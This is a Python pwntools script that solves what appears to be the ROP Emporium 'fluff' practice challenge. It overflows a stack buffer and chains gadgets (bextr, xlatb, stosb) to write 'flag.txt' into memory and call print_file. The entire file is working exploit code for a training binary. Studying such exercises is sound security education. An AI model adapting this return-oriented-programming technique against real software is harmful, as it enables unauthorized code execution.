import ctypes
from pwn import *

def prepare_rbx(target, rop):
    # Constants
    pop_rdx_pop_rcx_add_rcx_bextr_ret_gadget = p64(0x0040062a)      # pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret;
    magic_const = 0x3ef2

    # ROP Chaining
    rop.call(pop_rdx_pop_rcx_add_rcx_bextr_ret_gadget)
    rop.call(p64(0x4000)) # Extract 64 bits from offset 0 in RCX. Results will be written to RBX.
    rop.call(p64(ctypes.c_ulong(target - magic_const).value))

def prepare_al(target, current_al, rop, elf):
    '''
    return: The current value in the AL register
    '''
    xlat_ret_gadget = p64(0x00400628)                               # xlatb; ret;
    target_byte_addr = next(elf.search(target))
    rbx = ctypes.c_ulong(target_byte_addr - current_al).value
    prepare_rbx(rbx, rop)
    rop.call(xlat_ret_gadget)
    return target

# Set the pwntools context
context.arch = 'amd64'
context.log_level = 'info'

# Project constants
PROCESS = './fluff'
io = process(PROCESS)

# Gadgets
rop = ROP(io.elf)
writable_data_segment = p64(0x00601028)
stosb_gadget = p64(0x00400639)                                  # stosb byte [rdi], al; ret;
pop_rdi_ret = p64(0x004006a3)                                   # pop rdi; ret;
print_file = p64(io.elf.plt['print_file'])

# Build the ROP chain

# Point RDI to the writeable data segment
rop.call(pop_rdi_ret)
rop.call(writable_data_segment)

# Write the target to the writable data segment
target = b"flag.txt" # The target we want to write to memory
previous_al = 0x0b   # The initial value in the AL register before exploitation
for b in target:
    # Prepare the AL register
    previous_al = prepare_al(b, previous_al, rop, io.elf)

    # Write the byte from the AL register to the writable data segment
    rop.call(stosb_gadget)

# Point RDI to the writeable data segment that holds the target data. This is important because the stosb instruction mutated it.
rop.call(pop_rdi_ret)
rop.call(writable_data_segment)

# Dump the flag
rop.call(print_file)

# Build the payload
offset = 40
padding = b"A" * offset
payload = b"".join([
    padding,
    rop.chain()
])

# Pwn
io.clean()
io.sendline(payload)
io.interactive()
